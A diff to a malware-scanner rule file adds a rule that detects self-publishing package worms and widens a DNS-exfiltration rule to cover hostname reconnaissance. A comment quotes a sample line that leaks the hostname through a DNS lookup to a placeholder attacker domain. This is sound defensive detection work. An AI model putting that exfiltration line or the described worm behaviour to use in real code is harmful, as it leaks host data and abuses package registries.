@@ -296,6 +296,31 @@ rules:
         - capability: credential
         - capability: egress
 
+  - id: SUSPECT.REGISTRY.SELF_PUBLISH.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: high
+    title: Shipped code that publishes packages
+    message: >
+      This file runs a package-publishing command and writes package metadata.
+      That is what a registry-spam worm is: a package whose payload is
+      publishing more packages, each under a generated name, until the registry
+      or the account is stopped. A library has no reason to publish anything --
+      by the time it runs, its own release is long over.
+    remediation: >
+      Do not install this package, and report it to the registry. If you are its
+      author and this is release tooling, it does not belong in the published
+      artefact.
+    evidence_policy: hash_only
+    match:
+      kind: composite
+      scope: file
+      proximity: 200
+      all:
+        - rule: CAP.JS.PUBLISH.001
+        - capability: spawn
+
   - id: MALWARE.INSTALL.CONSUMER_CODE.001
     version: 1.0.0
     category: malicious
@@ -788,7 +813,15 @@ rules:
       proximity: 200
       all:
         - rule: CAP.EGRESS.DNS_CONSTRUCTED.001
-        - capability: credential
+        # Or reconnaissance. What goes out through a DNS label is whatever the
+        # host can be identified by, and that is far more often the hostname than
+        # a credential -- a DNS label is 63 bytes, which is room for a machine
+        # name and not for a key. Requiring `credential` meant the commonest
+        # DNS-tunnelling shape in the npm dataset matched nothing:
+        # `dns.resolve4(tohex(os.hostname()) + ".<id>.<attacker>")`.
+        - any:
+            - capability: credential
+            - capability: reconnaissance
 
   - id: SUSPECT.EXFIL.DROP_POINT.001
     version: 1.0.0
